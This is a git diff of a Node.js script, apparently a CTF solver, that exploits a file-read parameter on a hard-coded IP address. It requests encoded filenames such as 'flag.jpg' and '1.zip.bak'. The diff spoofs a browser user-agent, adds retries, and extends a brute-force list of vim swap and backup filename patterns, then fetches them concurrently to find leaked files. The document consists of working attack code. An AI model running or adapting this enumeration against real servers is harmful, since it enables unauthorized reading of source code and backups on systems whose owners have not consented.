@@ -3,6 +3,10 @@ const path = require('path')
 const got = require('got')
 const cheerio = require('cheerio')
 const flatten = require('just-flatten-it')
+const pAll = require('p-all')
+const Gauge = require('gauge')
+
+const FETCH_CONCURRENCY = 5
 
 const base64 = {
   encode (str, encoding = 'utf8') {
@@ -34,7 +38,12 @@ function encrypt (input) {
 
 async function fetch (filename) {
   const url = `http://117.51.150.246/index.php?jpg=${encrypt(filename)}`
-  const { body } = await got(url)
+  const { body } = await got(url, {
+    headers: {
+      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36',
+    },
+    retry: 5,
+  })
   const matched = body.match(/<\/title>(.*)<\/br>(.*)<\/br>/)
   const request = matched && matched[1]
   const name = matched && matched[2]
@@ -52,7 +61,7 @@ async function fetch (filename) {
 
 async function main () {
   try {
-    const result = await fetch('flag.jpg')
+    const result = await fetch('1.zip.bak')
     console.log(JSON.stringify(result, null, 2))
     console.log(result.content)
   } catch (error) {
@@ -65,6 +74,12 @@ async function debug () {
     (n) => `.${n}.swp`,
     (n) => `.${n}.swo`,
     (n) => `.${n}.swn`,
+    (n) => `.${n}.swm`,
+    (n) => `.${n}.swl`,
+    (n) => `.${n}.swk`,
+    (n) => `.${n}.swj`,
+    (n) => `.${n}.swi`,
+    (n) => `.${n}.swh`,
     (n) => `${n}.bak`,
     (n) => n,
   ]
@@ -73,15 +88,28 @@ async function debug () {
     .split('\n')
     .filter(Boolean)
 
+  const gauge = new Gauge()
+
   try {
-    const results = flatten(await Promise.all(filenames.map((name) => 
-      Promise.all(getFilenameFunctions.map((getFilename) =>
-        fetch(getFilename(name))
-      ))
-    )))
+    let counter = {
+      all: 0,
+      done: 0,
+    }
+    const requests = flatten(filenames.map((name) => 
+      getFilenameFunctions.map((getFilename) => 
+        () => fetch(getFilename(name)).then((response) => {
+          gauge.show('Fetch', ++counter.done / counter.all)
+          return response
+        })
+      )
+    ))
+    counter.all = requests.length
+    gauge.show('Fetch')
+    const results = await pAll(requests, { concurrency: FETCH_CONCURRENCY })
     const availables = results.filter(({ content }) => content)
     console.log(availables)
     } catch (error) {
+      console.log(error)
       console.error(`Error: ${error.message}`)
     }
 }
